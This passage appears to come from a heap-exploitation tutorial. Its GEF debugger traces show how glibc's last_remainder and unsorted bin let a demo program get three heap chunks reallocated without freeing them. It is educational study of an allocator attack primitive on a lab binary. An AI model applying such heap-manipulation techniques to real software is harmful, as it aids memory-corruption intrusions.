Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x555555559890, bk=0x555555559890
 →   Chunk(addr=0x5555555598a0, size=0x1c0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/30g 0x555555559890
0x555555559890: 0x5e0   0x1c1
0x5555555598a0: 0x7ffff7e2cd00  0x7ffff7e2cd00
0x5555555598b0: 0x0 0x0
0x5555555598c0: 0x0 0x0
0x5555555598d0: 0x0 0x0
0x5555555598e0: 0x0 0x0
0x5555555598f0: 0x0 0x0
0x555555559900: 0x0 0x0
0x555555559910: 0x0 0x0
0x555555559920: 0x0 0x91
0x555555559930: 0x0 0x0
0x555555559940: 0x0 0x0
0x555555559950: 0x0 0x0
0x555555559960: 0x0 0x0
0x555555559970: 0x0 0x0
```

Now, we have lined it up with `chunk0`. Let's go ahead and reallocate `chunk0`:

```
gef➤  c
Continuing.

Breakpoint 5, 0x0000555555555250 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555598a0  →  0x00007ffff7e2ceb0  →  0x00007ffff7e2cea0  →  0x00007ffff7e2ce90  →  0x00007ffff7e2ce80  →  0x00007ffff7e2ce70  →  0x00007ffff7e2ce60  →  0x00007ffff7e2ce50
$rbx   : 0x0             
$rcx   : 0x1c1           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf70  →  0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x10000000      
$rdi   : 0x80            
$rip   : 0x0000555555555250  →  <main+199> call 0x555555555090 <malloc@plt>
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x10000000      
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c3  →  "/Hackery/shogun/pwn_demos/unsorted_bin/la[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf70│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120    ← $rsp
0x00007fffffffdf78│+0x0008: 0x00005555555598a0  →  0x00007ffff7e2ceb0  →  0x00007ffff7e2cea0  →  0x00007ffff7e2ce90  →  0x00007ffff7e2ce80  →  0x00007ffff7e2ce70  →  0x00007ffff7e2ce60
0x00007fffffffdf80│+0x0010: 0x0000555555559930  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
0x00007fffffffdf88│+0x0018: 0x00005555555599c0  →  0x0000000000000000
0x00007fffffffdf90│+0x0020: 0x0000555555559a50  →  0x0000000000000130
0x00007fffffffdf98│+0x0028: 0x00005555555598a0  →  0x00007ffff7e2ceb0  →  0x00007ffff7e2cea0  →  0x00007ffff7e2ce90  →  0x00007ffff7e2ce80  →  0x00007ffff7e2ce70  →  0x00007ffff7e2ce60
0x00007fffffffdfa0│+0x0030: 0x0000000000000000
0x00007fffffffdfa8│+0x0038: 0x00007ffff7fe5080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555242 <main+185>    call   0x555555555090 <malloc@plt>
   0x555555555247 <main+190>    mov QWORD PTR [rbp-0x18], rax
   0x55555555524b <main+194>    mov edi, 0x80
 → 0x555555555250 <main+199>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000080,
   $rsi = 0x0000000010000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "last_remainder", stopped 0x555555555250 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555250 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$3 = 0x5555555598a0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x555555559920, bk=0x555555559920
 →   Chunk(addr=0x555555559930, size=0x130, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see, that we have reallocated `chunk0` (`0x5555555598a0`). Let's reallocate `chunk1` next:

```
gef➤  c
Continuing.

Breakpoint 6, 0x000055555555525e in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559930  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0xa0            
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf70  →  0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x80            
$rdi   : 0x80            
$rip   : 0x000055555555525e  →  <main+213> call 0x555555555090 <malloc@plt>
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x0000555555559a50  →  0x00000000000000a0
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c3  →  "/Hackery/shogun/pwn_demos/unsorted_bin/la[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf70│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120    ← $rsp
0x00007fffffffdf78│+0x0008: 0x00005555555598a0  →  0x00007ffff7e2ceb0  →  0x00007ffff7e2cea0  →  0x00007ffff7e2ce90  →  0x00007ffff7e2ce80  →  0x00007ffff7e2ce70  →  0x00007ffff7e2ce60
0x00007fffffffdf80│+0x0010: 0x0000555555559930  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
0x00007fffffffdf88│+0x0018: 0x00005555555599c0  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
0x00007fffffffdf90│+0x0020: 0x0000555555559a50  →  0x00000000000000a0
0x00007fffffffdf98│+0x0028: 0x00005555555598a0  →  0x00007ffff7e2ceb0  →  0x00007ffff7e2cea0  →  0x00007ffff7e2ce90  →  0x00007ffff7e2ce80  →  0x00007ffff7e2ce70  →  0x00007ffff7e2ce60
0x00007fffffffdfa0│+0x0030: 0x0000555555559930  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
0x00007fffffffdfa8│+0x0038: 0x00007ffff7fe5080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555250 <main+199>    call   0x555555555090 <malloc@plt>
   0x555555555255 <main+204>    mov QWORD PTR [rbp-0x10], rax
   0x555555555259 <main+208>    mov edi, 0x80
 → 0x55555555525e <main+213>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000080,
   $rsi = 0x0000000000000080
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "last_remainder", stopped 0x55555555525e in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555525e → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$4 = 0x555555559930
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x5555555599b0, bk=0x5555555599b0
 →   Chunk(addr=0x5555555599c0, size=0xa0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see that we have reallocated `chunk1` (`0x555555559930`). Let's reallocate `chunk2` next:

```
gef➤  c
Continuing.

Breakpoint 7, 0x0000555555555263 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555599c0  →  0x00007ffff7e2cd90  →  0x00007ffff7e2cd80  →  0x00007ffff7e2cd70  →  0x00007ffff7e2cd60  →  0x00007ffff7e2cd50  →  0x00007ffff7e2cd40  →  0x00007ffff7e2cd30
$rbx   : 0x0             
$rcx   : 0xa1            
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf70  →  0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x10000400      
$rdi   : 0x00005555555599b0  →  0x0000000000000000
$rip   : 0x0000555555555263  →  <main+218> mov QWORD PTR [rbp-0x8], rax
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x400           
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c3  →  "/Hackery/shogun/pwn_demos/unsorted_bin/la[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf70│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120    ← $rsp
0x00007fffffffdf78│+0x0008: 0x00005555555598a0  →  0x00007ffff7e2ceb0  →  0x00007ffff7e2cea0  →  0x00007ffff7e2ce90  →  0x00007ffff7e2ce80  →  0x00007ffff7e2ce70  →  0x00007ffff7e2ce60
0x00007fffffffdf80│+0x0010: 0x0000555555559930  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
0x00007fffffffdf88│+0x0018: 0x00005555555599c0  →  0x00007ffff7e2cd90  →  0x00007ffff7e2cd80  →  0x00007ffff7e2cd70  →  0x00007ffff7e2cd60  →  0x00007ffff7e2cd50  →  0x00007ffff7e2cd40
0x00007fffffffdf90│+0x0020: 0x0000555555559a50  →  0x00000000000000a0
0x00007fffffffdf98│+0x0028: 0x00005555555598a0  →  0x00007ffff7e2ceb0  →  0x00007ffff7e2cea0  →  0x00007ffff7e2ce90  →  0x00007ffff7e2ce80  →  0x00007ffff7e2ce70  →  0x00007ffff7e2ce60
0x00007fffffffdfa0│+0x0030: 0x0000555555559930  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
0x00007fffffffdfa8│+0x0038: 0x00007ffff7fe5080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555255 <main+204>    mov QWORD PTR [rbp-0x10], rax
   0x555555555259 <main+208>    mov edi, 0x80
   0x55555555525e <main+213>    call   0x555555555090 <malloc@plt>
 → 0x555555555263 <main+218>    mov QWORD PTR [rbp-0x8], rax
   0x555555555267 <main+222>    mov rax, QWORD PTR [rbp-0x38]
   0x55555555526b <main+226>    cmp rax, QWORD PTR [rbp-0x18]
   0x55555555526f <main+230>    jne 0x55555555527a <main+241>
   0x555555555271 <main+232>    lea rax, [rip+0xd8c]        # 0x555555556004
   0x555555555278 <main+239>    jmp 0x555555555281 <main+248>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "last_remainder", stopped 0x555555555263 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555263 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$5 = 0x5555555599c0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  c
Continuing.
Did we reallocate chunk0:   Yes
Did we reallocate chunk1:   Yes
Did we reallocate chunk2:   Yes
[Inferior 1 (process 102218) exited with code 036]
```

We end up with reallocating `chunk2` (`0x5555555599c0`). Just like that, with leveraging the last_remainder, we have reallocated multiple heap chunks without freeing them.


